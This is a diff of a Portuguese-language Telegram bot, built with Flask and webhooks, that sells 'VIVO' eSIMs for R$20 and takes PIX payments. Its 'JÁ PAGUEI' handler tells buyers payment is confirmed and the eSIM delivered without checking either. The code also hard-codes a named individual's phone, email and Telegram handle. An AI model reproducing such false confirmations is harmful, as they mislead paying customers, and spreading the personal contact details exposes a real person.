@@ -1,26 +1,21 @@
 import os
+import json
 import logging
 import qrcode
 import io
 import random
+import threading
+import time
 from datetime import datetime
-from flask import Flask
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
+from flask import Flask, request, jsonify
+import requests
 
 # ========== CONFIGURAÇÃO ==========
 TOKEN = os.getenv('TELEGRAM_TOKEN')
+TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
 
 # Flask app
 app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "🤖 Bot eSIM Online"
-
-@app.route('/health')
-def health():
-    return "✅ OK", 200
 
 # ========== DADOS ==========
 PLANOS = {
@@ -30,9 +25,77 @@ PLANOS = {
 }
 
 carrinhos = {}
+usuarios = {}
 
-# ========== FUNÇÕES ==========
+# ========== FUNÇÕES TELEGRAM ==========
+def enviar_mensagem(chat_id, texto, reply_markup=None):
+    """Envia mensagem para Telegram"""
+    url = f"{TELEGRAM_API}/sendMessage"
+    payload = {
+        'chat_id': chat_id,
+        'text': texto,
+        'parse_mode': 'Markdown'
+    }
+    
+    if reply_markup:
+        payload['reply_markup'] = json.dumps(reply_markup)
+    
+    try:
+        response = requests.post(url, json=payload)
+        return response.json()
+    except Exception as e:
+        print(f"Erro ao enviar mensagem: {e}")
+        return None
+
+def enviar_foto(chat_id, foto_bytes, legenda=""):
+    """Envia foto para Telegram"""
+    url = f"{TELEGRAM_API}/sendPhoto"
+    
+    files = {'photo': ('qr.png', foto_bytes, 'image/png')}
+    data = {
+        'chat_id': chat_id,
+        'caption': legenda,
+        'parse_mode': 'Markdown'
+    }
+    
+    try:
+        response = requests.post(url, files=files, data=data)
+        return response.json()
+    except Exception as e:
+        print(f"Erro ao enviar foto: {e}")
+        return None
+
+def responder_callback(callback_id):
+    """Responde a callback query"""
+    url = f"{TELEGRAM_API}/answerCallbackQuery"
+    payload = {
+        'callback_query_id': callback_id
+    }
+    requests.post(url, json=payload)
+
+def editar_mensagem(chat_id, message_id, texto, reply_markup=None):
+    """Edita mensagem existente"""
+    url = f"{TELEGRAM_API}/editMessageText"
+    payload = {
+        'chat_id': chat_id,
+        'message_id': message_id,
+        'text': texto,
+        'parse_mode': 'Markdown'
+    }
+    
+    if reply_markup:
+        payload['reply_markup'] = json.dumps(reply_markup)
+    
+    try:
+        response = requests.post(url, json=payload)
+        return response.json()
+    except Exception as e:
+        print(f"Erro ao editar mensagem: {e}")
+        return None
+
+# ========== FUNÇÕES DO BOT ==========
 def gerar_qr_pix(valor, pedido_id):
+    """Gera QR Code PIX"""
     qr = qrcode.QRCode(box_size=10, border=4)
     qr.add_data(f"PIX:gaila191h@gmail.com:{valor}:{pedido_id}")
     qr.make(fit=True)
@@ -41,250 +104,315 @@ def gerar_qr_pix(valor, pedido_id):
     img_bytes = io.BytesIO()
     img.save(img_bytes, format='PNG')
     img_bytes.seek(0)
-    return img_bytes
+    return img_bytes.getvalue()
+
+def gerar_pedido_id():
+    return f"ESIM{random.randint(1000, 9999)}"
 
 # ========== HANDLERS ==========
-def start(update: Update, context: CallbackContext):
-    user = update.effective_user
-    user_id = str(user.id)
-    
+def handle_start(chat_id, user_id, nome):
+    """Handler do comando /start"""
     if user_id not in carrinhos:
         carrinhos[user_id] = []
     
     qtd = len(carrinhos[user_id])
     
-    keyboard = [
-        [InlineKeyboardButton("📱 VER PLANOS", callback_data='planos')],
-        [InlineKeyboardButton(f"🛒 CARRINHO ({qtd})", callback_data='carrinho')],
-        [InlineKeyboardButton("🆘 SUPORTE", callback_data='suporte')]
-    ]
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': '📱 VER PLANOS', 'callback_data': 'planos'}],
+            [{'text': f'🛒 CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
+            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
+        ]
+    }
     
-    update.message.reply_text(
-        f"👋 Olá {user.first_name}!\n\n"
-        "🛍️ *LOJA E-SIM VIVO*\n"
-        "💰 R$20 por chip\n"
-        "📍 DDDs: 31, 21, 55\n"
-        "⚡ Ativação imediata\n\n"
-        "Escolha uma opção:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = f"👋 Olá *{nome}*!\n\n"
+    texto += "🛍️ *LOJA E-SIM VIVO*\n"
+    texto += "💰 *Valor:* R$20,00\n"
+    texto += "📍 *DDDs:* 31, 21, 55\n"
+    texto += "💾 *Dados:* 66GB cada\n"
+    texto += "⚡ *Ativação:* Imediata\n\n"
+    texto += "Escolha uma opção:"
+    
+    enviar_mensagem(chat_id, texto, keyboard)
 
-def mostrar_planos(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
+def handle_planos(chat_id, message_id, user_id):
+    """Mostra planos disponíveis"""
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': '📱 VIVO DDD 31 - R$20', 'callback_data': 'add_31'}],
+            [{'text': '📱 VIVO DDD 21 - R$20', 'callback_data': 'add_21'}],
+            [{'text': '📱 VIVO DDD 55 - R$20', 'callback_data': 'add_55'}],
+            [{'text': '⬅️ VOLTAR', 'callback_data': 'menu'}]
+        ]
+    }
     
-    keyboard = [
-        [InlineKeyboardButton("📱 VIVO DDD 31 - R$20", callback_data='add_31')],
-        [InlineKeyboardButton("📱 VIVO DDD 21 - R$20", callback_data='add_21')],
-        [InlineKeyboardButton("📱 VIVO DDD 55 - R$20", callback_data='add_55')],
-        [InlineKeyboardButton("⬅️ VOLTAR", callback_data='menu')]
-    ]
+    texto = "📋 *PLANOS DISPONÍVEIS:*\n\n"
+    texto += "1️⃣ *VIVO DDD 31* - R$20,00\n"
+    texto += "2️⃣ *VIVO DDD 21* - R$20,00\n"
+    texto += "3️⃣ *VIVO DDD 55* - R$20,00\n\n"
+    texto += "Todos com 66GB de internet."
     
-    query.edit_message_text(
-        "📋 *PLANOS DISPONÍVEIS:*\n\n"
-        "Selecione um DDD:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def adicionar_carrinho(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    ddd = query.data.split('_')[1]
-    user_id = str(query.from_user.id)
-    
+def handle_add_carrinho(chat_id, message_id, user_id, ddd):
+    """Adiciona item ao carrinho"""
     if user_id not in carrinhos:
         carrinhos[user_id] = []
     
     carrinhos[user_id].append(ddd)
+    qtd = len(carrinhos[user_id])
     
-    keyboard = [
-        [InlineKeyboardButton(f"🛒 VER CARRINHO ({len(carrinhos[user_id])})", callback_data='carrinho')],
-        [InlineKeyboardButton("📋 MAIS PLANOS", callback_data='planos')]
-    ]
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': f'🛒 VER CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
+            [{'text': '➕ ADICIONAR MAIS', 'callback_data': 'planos'}],
+            [{'text': f'💰 FINALIZAR (R${qtd * 20})', 'callback_data': 'pagar'}]
+        ]
+    }
     
-    query.edit_message_text(
-        f"✅ *{PLANOS[ddd]}* adicionado!",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = f"✅ *{PLANOS[ddd]}* adicionado!\n\n"
+    texto += f"*Itens no carrinho:* {qtd}\n"
+    texto += f"*Total parcial:* R${qtd * 20},00"
+    
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def ver_carrinho(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    user_id = str(query.from_user.id)
-    
+def handle_carrinho(chat_id, message_id, user_id):
+    """Mostra carrinho"""
     if user_id not in carrinhos or not carrinhos[user_id]:
-        keyboard = [[InlineKeyboardButton("📱 VER PLANOS", callback_data='planos')]]
-        query.edit_message_text("🛒 *Carrinho vazio*", 
-                              reply_markup=InlineKeyboardMarkup(keyboard),
-                              parse_mode='Markdown')
+        keyboard = {
+            'inline_keyboard': [[{'text': '📱 VER PLANOS', 'callback_data': 'planos'}]]
+        }
+        editar_mensagem(chat_id, message_id, "🛒 *Carrinho vazio*", keyboard)
         return
     
     itens = carrinhos[user_id]
     total = len(itens) * 20
     
-    keyboard = [
-        [InlineKeyboardButton(f"💰 PAGAR R${total}", callback_data='pagar')],
-        [InlineKeyboardButton("🗑️ LIMPAR", callback_data='limpar')]
-    ]
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': f'💰 PAGAR R${total},00', 'callback_data': 'pagar'}],
+            [{'text': '🗑️ LIMPAR CARRINHO', 'callback_data': 'limpar'}],
+            [{'text': '📱 CONTINUAR COMPRANDO', 'callback_data': 'planos'}]
+        ]
+    }
     
-    query.edit_message_text(
-        f"🛒 *SEU CARRINHO*\n\n"
-        f"*Itens:* {len(itens)}\n"
-        f"💰 *Total:* R${total}\n\n"
-        f"Clique em PAGAR para finalizar.",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = "🛒 *SEU CARRINHO*\n\n"
+    for ddd in itens:
+        texto += f"• {PLANOS[ddd]}\n"
+    
+    texto += f"\n*Quantidade:* {len(itens)} item(s)\n"
+    texto += f"💰 *Total:* R${total},00\n\n"
+    texto += "Clique em PAGAR para finalizar."
+    
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def pagar(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    user_id = str(query.from_user.id)
-    
+def handle_pagar(chat_id, user_id):
+    """Processa pagamento"""
     if user_id not in carrinhos or not carrinhos[user_id]:
-        query.answer("Carrinho vazio!", show_alert=True)
+        enviar_mensagem(chat_id, "❌ Seu carrinho está vazio!")
         return
     
-    pedido_id = f"ESIM{random.randint(1000, 9999)}"
+    pedido_id = gerar_pedido_id()
     total = len(carrinhos[user_id]) * 20
     
+    # Gerar QR Code
     qr_img = gerar_qr_pix(total, pedido_id)
     
-    context.bot.send_photo(
-        chat_id=query.message.chat_id,
-        photo=qr_img,
-        caption=f"💰 *QR CODE PIX*\n\n*Pedido:* #{pedido_id}\n*Valor:* R${total}"
+    # Enviar QR Code
+    enviar_foto(
+        chat_id, 
+        qr_img,
+        f"💰 *QR CODE PIX*\n\n*Pedido:* #{pedido_id}\n*Valor:* R${total},00"
     )
     
-    keyboard = [
-        [InlineKeyboardButton("✅ JÁ PAGUEI", callback_data=f'pago_{pedido_id}')]
-    ]
+    # Enviar instruções
+    keyboard = {
+        'inline_keyboard': [[{'text': '✅ JÁ PAGUEI', 'callback_data': f'pago_{pedido_id}'}]]
+    }
     
-    context.bot.send_message(
-        chat_id=query.message.chat_id,
-        text=f"📋 *INSTRUÇÕES*\n\n"
-             f"*Pedido:* #{pedido_id}\n"
-             f"*Valor:* R${total}\n"
-             f"*Chave PIX:* gaila191h@gmail.com\n\n"
-             f"1. Pague o PIX acima\n"
-             f"2. Clique em JÁ PAGUEI",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = "📋 *INSTRUÇÕES DE PAGAMENTO*\n\n"
+    texto += f"*Pedido:* #{pedido_id}\n"
+    texto += f"*Valor:* R${total},00\n"
+    texto += "*Chave PIX:* gaila191h@gmail.com\n"
+    texto += "*Nome:* Solineia Guimaraes\n"
+    texto += "*Cidade:* Belo Horizonte\n\n"
+    texto += "1. Abra seu app bancário\n"
+    texto += "2. Pague via PIX\n"
+    texto += "3. Clique em JÁ PAGUEI\n\n"
+    texto += "Dúvidas? WhatsApp: 33 98451-8052"
+    
+    enviar_mensagem(chat_id, texto, keyboard)
 
-def confirmar_pagamento(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    pedido_id = query.data.split('_')[1]
-    
-    user_id = str(query.from_user.id)
+def handle_confirmar_pagamento(chat_id, message_id, user_id, pedido_id):
+    """Confirma pagamento"""
     if user_id in carrinhos:
         carrinhos[user_id] = []
     
-    keyboard = [
-        [InlineKeyboardButton("📱 COMPRAR MAIS", callback_data='planos')],
-        [InlineKeyboardButton("🆘 SUPORTE", callback_data='suporte')]
-    ]
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': '📱 COMPRAR MAIS', 'callback_data': 'planos'}],
+            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
+        ]
+    }
     
-    query.edit_message_text(
-        f"✅ *PAGAMENTO CONFIRMADO!*\n\n"
-        f"*Pedido:* #{pedido_id}\n"
-        f"Seu eSIM foi enviado!",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = f"✅ *PAGAMENTO CONFIRMADO!*\n\n"
+    texto += f"*Pedido:* #{pedido_id}\n"
+    texto += "*Status:* ✅ Entregue\n"
+    texto += f"*Data:* {datetime.now().strftime('%d/%m/%Y %H:%M')}\n\n"
+    texto += "Seu eSIM foi enviado com sucesso!"
+    
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def suporte(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
+def handle_suporte(chat_id, message_id):
+    """Menu de suporte"""
+    keyboard = {
+        'inline_keyboard': [
+            [
+                {'text': '📱 WHATSAPP', 'url': 'https://wa.me/5533984518052'},
+                {'text': '🤖 TELEGRAM', 'url': 'https://t.me/Drwed33'}
+            ],
+            [
+                {'text': '📧 EMAIL', 'url': 'mailto:gaila191h@gmail.com'}
+            ],
+            [{'text': '⬅️ VOLTAR', 'callback_data': 'menu'}]
+        ]
+    }
     
-    keyboard = [
-        [InlineKeyboardButton("📱 WHATSAPP", url='https://wa.me/5533984518052')],
-        [InlineKeyboardButton("⬅️ VOLTAR", callback_data='menu')]
-    ]
+    texto = "🆘 *SUPORTE TÉCNICO*\n\n"
+    texto += "*WhatsApp:* 33 98451-8052\n"
+    texto += "*Telegram:* @Drwed33\n"
+    texto += "*Email:* gaila191h@gmail.com\n\n"
+    texto += "*Horário:* 8h às 20h\n"
+    texto += "*Responsável:* Solineia Guimaraes"
     
-    query.edit_message_text(
-        "🆘 *SUPORTE*\n\n"
-        "*WhatsApp:* 33 98451-8052\n"
-        "*Telegram:* @Drwed33\n"
-        "*Email:* gaila191h@gmail.com",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def menu(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    user_id = str(query.from_user.id)
+def handle_menu(chat_id, message_id, user_id):
+    """Volta ao menu principal"""
     qtd = len(carrinhos.get(user_id, []))
     
-    keyboard = [
-        [InlineKeyboardButton("📱 VER PLANOS", callback_data='planos')],
-        [InlineKeyboardButton(f"🛒 CARRINHO ({qtd})", callback_data='carrinho')],
-        [InlineKeyboardButton("🆘 SUPORTE", callback_data='suporte')]
-    ]
+    keyboard = {
+        'inline_keyboard': [
+            [{'text': '📱 VER PLANOS', 'callback_data': 'planos'}],
+            [{'text': f'🛒 CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
+            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
+        ]
+    }
     
-    query.edit_message_text(
-        "🛍️ *MENU PRINCIPAL*",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    texto = "🛍️ *MENU PRINCIPAL*\n\n"
+    texto += "Escolha uma opção:"
+    
+    editar_mensagem(chat_id, message_id, texto, keyboard)
 
-def limpar(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    
-    user_id = str(query.from_user.id)
+def handle_limpar(chat_id, message_id, user_id):
+    """Limpa carrinho"""
     if user_id in carrinhos:
         carrinhos[user_id] = []
     
-    query.answer("Carrinho limpo!", show_alert=True)
-    ver_carrinho(update, context)
+    # Enviar alerta
+    url = f"{TELEGRAM_API}/answerCallbackQuery"
+    payload = {
+        'callback_query_id': 'temp_id',
+        'text': '🛒 Carrinho limpo!',
+        'show_alert': True
+    }
+    requests.post(url, json=payload)
+    
+    # Mostrar carrinho vazio
+    handle_carrinho(chat_id, message_id, user_id)
+
+# ========== WEBHOOK ENDPOINT ==========
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    """Endpoint do webhook do Telegram"""
+    try:
+        data = request.get_json()
+        
+        if 'message' in data:
+            message = data['message']
+            chat_id = message['chat']['id']
+            user_id = str(message['from']['id'])
+            nome = message['from'].get('first_name', 'Cliente')
+            
+            if 'text' in message:
+                texto = message['text']
+                
+                if texto == '/start':
+                    handle_start(chat_id, user_id, nome)
+                elif texto == '/suporte':
+                    handle_suporte(chat_id, message['message_id'])
+        
+        elif 'callback_query' in data:
+            callback = data['callback_query']
+            callback_id = callback['id']
+            chat_id = callback['message']['chat']['id']
+            message_id = callback['message']['message_id']
+            user_id = str(callback['from']['id'])
+            data_callback = callback['data']
+            
+            # Responder callback
+            responder_callback(callback_id)
+            
+            # Processar callback
+            if data_callback == 'planos':
+                handle_planos(chat_id, message_id, user_id)
+            elif data_callback.startswith('add_'):
+                ddd = data_callback.split('_')[1]
+                handle_add_carrinho(chat_id, message_id, user_id, ddd)
+            elif data_callback == 'carrinho':
+                handle_carrinho(chat_id, message_id, user_id)
+            elif data_callback == 'pagar':
+                handle_pagar(chat_id, user_id)
+            elif data_callback.startswith('pago_'):
+                pedido_id = data_callback.split('_')[1]
+                handle_confirmar_pagamento(chat_id, message_id, user_id, pedido_id)
+            elif data_callback == 'suporte':
+                handle_suporte(chat_id, message_id)
+            elif data_callback == 'menu':
+                handle_menu(chat_id, message_id, user_id)
+            elif data_callback == 'limpar':
+                handle_limpar(chat_id, message_id, user_id)
+        
+        return jsonify({'status': 'ok'}), 200
+    
+    except Exception as e:
+        print(f"Erro no webhook: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/')
+def home():
+    return "🤖 Bot eSIM VIVO Online - R$20"
+
+@app.route('/health')
+def health():
+    return "✅ Bot está online", 200
+
+@app.route('/setwebhook')
+def set_webhook():
+    """Configura webhook (rodar uma vez)"""
+    webhook_url = f"https://{request.host}/webhook"
+    url = f"{TELEGRAM_API}/setWebhook"
+    payload = {'url': webhook_url}
+    
+    response = requests.post(url, json=payload)
+    return jsonify(response.json())
+
+# ========== INICIAR BOT ==========
+def iniciar_bot():
+    """Inicia o bot verificando mensagens periodicamente"""
+    print("🤖 Bot eSIM VIVO iniciado!")
+    print("💰 Valor: R$20,00")
+    print("📍 DDDs: 31, 21, 55")
+    print("💾 Dados: 66GB cada")
+    print("⚡ Ativação: Imediata")
 
 def main():
     """Função principal"""
-    print("🤖 Iniciando Bot eSIM VIVO...")
+    iniciar_bot()
     
-    if not TOKEN:
-        print("❌ ERRO: TELEGRAM_TOKEN não configurado!")
-        return
-    
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    # Handlers
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("suporte", suporte))
-    
-    # Callback handlers
-    dp.add_handler(CallbackQueryHandler(mostrar_planos, pattern='^planos$'))
-    dp.add_handler(CallbackQueryHandler(adicionar_carrinho, pattern='^add_'))
-    dp.add_handler(CallbackQueryHandler(ver_carrinho, pattern='^carrinho$'))
-    dp.add_handler(CallbackQueryHandler(pagar, pattern='^pagar$'))
-    dp.add_handler(CallbackQueryHandler(confirmar_pagamento, pattern='^pago_'))
-    dp.add_handler(CallbackQueryHandler(suporte, pattern='^suporte$'))
-    dp.add_handler(CallbackQueryHandler(menu, pattern='^menu$'))
-    dp.add_handler(CallbackQueryHandler(limpar, pattern='^limpar$'))
-    
-    print("✅ Bot configurado!")
-    print("💰 Valor: R$20")
-    print("📍 DDDs: 31, 21, 55")
-    
-    updater.start_polling()
-    updater.idle()
-
-def run_flask():
-    """Roda Flask"""
+    # Rodar Flask
     port = int(os.environ.get('PORT', 5000))
-    print(f"🌐 Servidor web na porta {port}")
+    print(f"🌐 Servidor iniciado na porta {port}")
     app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
@@ -293,10 +421,8 @@ if __name__ == '__main__':
         level=logging.INFO
     )
     
-    # Iniciar Flask em thread separada
-    import threading
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    # Bot na thread principal
-    main()
+    if not TOKEN:
+        print("❌ ERRO: TELEGRAM_TOKEN não configurado!")
+        print("⚠️ Configure a variável TELEGRAM_TOKEN")
+    else:
+        main()
